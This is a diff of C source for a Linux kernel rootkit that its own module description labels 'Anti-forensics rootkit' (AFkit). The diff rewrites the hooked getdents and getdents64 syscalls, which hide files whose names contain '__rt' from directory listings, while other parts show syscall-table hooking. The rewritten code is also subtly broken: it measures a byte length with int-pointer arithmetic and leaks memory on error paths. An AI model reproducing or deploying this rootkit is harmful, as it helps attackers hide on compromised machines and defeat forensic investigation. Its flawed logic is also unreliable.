@@ -1,7 +1,6 @@
 // ###########################################################################################################
 // ###########################################################################################################
 
-#include <asm/unistd.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/init.h>
@@ -11,55 +10,12 @@
 #include <linux/fdtable.h>
 #include <linux/syscalls.h>
 #include <linux/kobject.h>
+#include <linux/kallsyms.h>
+#include <linux/slab.h>
 
-// ###########################################################################################################
-// ###########################################################################################################
+// ===========================================================================================================
 
-// Misc strings
-#define HIDE_STRING "__rt"
-#define MODULE_NAME "AFkit"
-
-// SYSCALL TABLE define and vars
-#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
-#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)
-
-// SYSCALL definitions and vars
-unsigned long **syscall_table;
-
-typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
-kill_ptr orig_kill;
-
-typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-getdents_ptr orig_getdents;
-
-typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-getdents64_ptr orig_getdents64;
-
-typedef asmlinkage long (*open_ptr)(const char *pathname, int flag, mode_t mode);
-open_ptr orig_open;
-
-typedef asmlinkage long (*chdir_ptr)(const char *pathname);
-chdir_ptr orig_chdir;
-
-// DIRECTORY ENTRY struct
-struct linux_dirent {
-	unsigned long d_ino;
-	unsigned long d_off;
-	unsigned short d_reclen;
-	char d_name[256];
-	char pad;
-	char d_type;
-};
-
-// COMMAND vars
-static bool files_dirs_view = false;
-static bool files_dirs_content = false;
-static bool ram_dump_shield = false;
-static bool module_hidden = false;
-
-// Module hide vars
-static struct list_head *module_previous;
-static struct list_head *module_kobj_previous;
+#include "AFkit__rt.h"
 
 // ###########################################################################################################
 // ###########################################################################################################
@@ -163,51 +119,89 @@ asmlinkage int custom_chdir(const char *pathname){
 // Custom getdents syscall.
 // Used to avoid __rt files listing
 asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent *dirp, size_t count){
-	int pos;
-	long ret;
+  int ret;
+  struct linux_dirent *self = dirp;
+  int pos = 0;
 
-	ret = orig_getdents(fd, dirp, count);
-	if(ret <= 0) return ret;
+  // Call the original function
+  // Directory entries will be written to a buffer pointed to by dirp
+  ret = orig_getdents(fd, dirp, count);
 
-	for(pos = 0; pos < ret; ){
-		char *ptr = (char *)dirp + pos;
-		struct linux_dirent *d = (struct linux_dirent *)ptr;
+  // Iterate through the directory entries
+  while(pos < ret){
+  	// Check prefix
+    if((strstr(self->d_name, HIDE_STRING) != NULL) && (files_dirs_view == true)){
+    	int err;
+      	int reclen = self->d_reclen; // Size of self dirent
+      	char* next_rec = (char*)self + reclen; // Address of next dirent
+      	int len = (int *)dirp + ret - (int *)next_rec; // Bytes from the next dirent to end of the last
+      	char* remaining_dirents = kmalloc(len, GFP_KERNEL);
 
-		if((strstr(d->d_name, HIDE_STRING) != NULL) && (files_dirs_view == true)){
-			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
-			ret -= d->d_reclen;
-		}
-		else{
-			pos += d->d_reclen;
-		}
-	}
+      	// Copy the next and following dirents to kernel memory
+      	err = copy_from_user(remaining_dirents, next_rec, len);
+      	if(err) continue;
+      	
+      	// Overwrite (delete) the self dirent in user memory
+      	err = copy_to_user(self, remaining_dirents, len);
+      	if (err) continue;
+      	
+      	kfree(remaining_dirents);
 
-	return ret;
+	    // Adjust the return value;
+      	ret -= reclen;
+      	continue;
+    }
+
+    // Get the next dirent
+    pos += self->d_reclen;
+    self = (struct linux_dirent *) ((char*)dirp + pos);
+  }
+
+  return ret;
 }
 
 // Custom getdents64 syscall.
 // Used to avoid __rt files listing
 asmlinkage long custom_getdents64(unsigned int fd, struct linux_dirent64 *dirp, size_t count){
-	int pos;
-	long ret;
+  int ret;
+  struct linux_dirent64 *self = dirp;
+  int pos = 0;
 
-	ret = orig_getdents64(fd, dirp, count);
-	if(ret <= 0) return ret;
+  // Call the original function
+  // Directory entries will be written to a buffer pointed to by dirp
+  ret = orig_getdents64(fd, dirp, count);
 
-	for(pos = 0; pos < ret; ){
-		char *ptr = (char *)dirp + pos;
-		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;
+  // Iterate through the directory entries
+  while(pos < ret){
+  	// Check prefix
+    if((strstr(self->d_name, HIDE_STRING) != NULL) && (files_dirs_view == true)){
+    	int err;
+      	int reclen = self->d_reclen; // Size of self dirent
+      	char* next_rec = (char*)self + reclen; // Address of next dirent
+      	int len = (int *)dirp + ret - (int *)next_rec; // Bytes from the next dirent to end of the last
+      	char* remaining_dirents = kmalloc(len, GFP_KERNEL);
 
-		if((strstr(d->d_name, HIDE_STRING) != NULL) && (files_dirs_view == true)){
-			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
-			ret -= d->d_reclen;
-		}
-		else{
-			pos += d->d_reclen;
-		}
-}
+      	// Copy the next and following dirents to kernel memory
+      	err = copy_from_user(remaining_dirents, next_rec, len);
+      	if(err) continue;
+      	
+      	// Overwrite (delete) the self dirent in user memory
+      	err = copy_to_user(self, remaining_dirents, len);
+      	if (err) continue;
+      	
+      	kfree(remaining_dirents);
 
-return ret;
+	    // Adjust the return value;
+      	ret -= reclen;
+      	continue;
+    }
+
+    // Get the next dirent
+    pos += self->d_reclen;
+    self = (struct linux_dirent64 *) ((char*)dirp + pos);
+  }
+
+  return ret;
 }
 
 // Custom open syscall.
@@ -222,7 +216,7 @@ asmlinkage int custom_open(const char *pathname, int flag, mode_t mode){
 	else{
 		return orig_open(pathname, flag, mode);
 	}
-}
+}	
 
 // Function used to backup default syscalls and hook customized ones
 static void hook_syscall_table(void){
@@ -255,7 +249,7 @@ static void restore_syscall_table(void){
 // ###########################################################################################################
 
 // Init function
-static int rootkit_init(void){
+static int afkit_init(void){
 	if(!(syscall_table = get_syscall_table())) return -1;
 	hook_syscall_table();
 
@@ -263,16 +257,15 @@ static int rootkit_init(void){
 }
 
 // Exit function
-static void rootkit_exit(void){
+static void afkit_exit(void){
 	restore_syscall_table();
-
 }
 
 // ###########################################################################################################
 // ###########################################################################################################
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+module_init(afkit_init);
+module_exit(afkit_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Anti-forensics rootkit");
@@ -280,3 +273,4 @@ MODULE_AUTHOR("T0t3m");
 
 // ###########################################################################################################
 // ###########################################################################################################
+
